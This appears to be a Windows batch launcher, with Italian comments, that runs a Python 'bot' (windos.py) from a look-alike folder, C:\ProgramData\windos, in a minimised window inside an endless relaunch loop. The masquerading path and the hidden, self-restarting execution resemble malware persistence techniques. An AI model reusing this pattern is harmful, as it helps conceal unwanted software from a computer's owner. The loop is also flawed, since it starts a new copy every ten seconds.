@echo off
cd C:\ProgramData\windos

:: Verifica se Python è installato
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [⚠] Python non trovato! Installalo prima di avviare il bot. >> C:\ProgramData\windos\windos.log
    exit
)

:: Nascondere il terminale e avviare il bot in loop
echo [✔] Avvio del bot... >> C:\ProgramData\windos\windos.log
:loop
start /min cmd /c python windos.py >> C:\ProgramData\windos\windos.log 2>&1
timeout /t 10 >nul
goto loop
